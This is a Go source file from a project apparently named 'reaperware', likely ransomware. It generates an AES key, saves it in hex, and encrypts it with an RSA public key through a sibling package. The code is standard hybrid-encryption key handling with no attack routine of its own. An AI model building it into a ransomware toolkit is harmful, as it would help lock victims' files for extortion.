package aeskeys

import (
	"crypto/rand"
	"encoding/hex"
	"log"
	"os"
	"reaperware/pkg/rsakeys"
	"time"
)

const (
	// Define AES key file name
	aesKeyFile string = "aes_key.txt"
)

// AESKeyManager handles operations related to AES key generation, encoding, and file management
type AESKeyManager struct {
	Key []byte
}

// NewAESKeyManager initializes the AESKeyManager struct by generating a new AES key
func NewAESKeyManager(keySize int) *AESKeyManager {
	// Generate a random AES key
	key := make([]byte, keySize)
	_, err := rand.Read(key)
	if err != nil {
		log.Fatalln("[-] Error generating AES key:", err)
	}
	return &AESKeyManager{Key: key}
}

// EncodeKeyAsHex encodes the AES key as a hexadecimal string
func (a *AESKeyManager) EncodeKeyAsHex() string {
	return hex.EncodeToString(a.Key)
}

// DecodeKeyHex decodes a hexadecimal string into the AES key bytes
func (a *AESKeyManager) DecodeKeyHex(hexKey string) {
	decodedKey, err := hex.DecodeString(hexKey)
	if err != nil {
		log.Fatalln("[-] Error decoding AES key from hex:", err)
	}
	a.Key = decodedKey
}

// WriteKeyToFile writes the AES key in hexadecimal format to a file
func (a *AESKeyManager) WriteKeyToFile() {
	keyHex := a.EncodeKeyAsHex()
	err := os.WriteFile(aesKeyFile, []byte(keyHex), 0600)
	if err != nil {
		log.Fatalln("[-] Error writing AES key to file:", err)
	}

	log.Println("[+] AES key saved to", aesKeyFile)
}

// ReadKeyHexFile reads the hexadecimal AES key from the file and decodes it
func (a *AESKeyManager) ReadKeyHexFile() {
	aesKeyHex, err := os.ReadFile(aesKeyFile)
	if err != nil {
		log.Fatalln("[-] Error reading AES key file:", err)
	}
	a.DecodeKeyHex(string(aesKeyHex))
}

func CreateAESKey(rsaPublicKey []byte) []byte {
	// AES
	initAESGen := time.Now()
	aesKeyManager := NewAESKeyManager(32)
	aesKeyManager.WriteKeyToFile()
	// aesKeyManager.ReadKeyHexFile()
	// log.Printf("Decoded AES Key: %x\n", aesKeyManager.Key)
	// Encrypting AES with RSA
	// Initialize RSAEncryptor
	aesEncryptor := rsakeys.NewRSAEncryptor(rsakeys.EncryptedAESBinFile)
	// Encrypt AES key and save it to a file
	aesKey := aesKeyManager.Key
	aesEncryptor.EncryptAndSaveAESKey(rsaPublicKey, aesKey)
	elapsedAES := time.Since(initAESGen)
	log.Println("[*] Time AES keys have taken to create:", elapsedAES)
	return aesKey
}
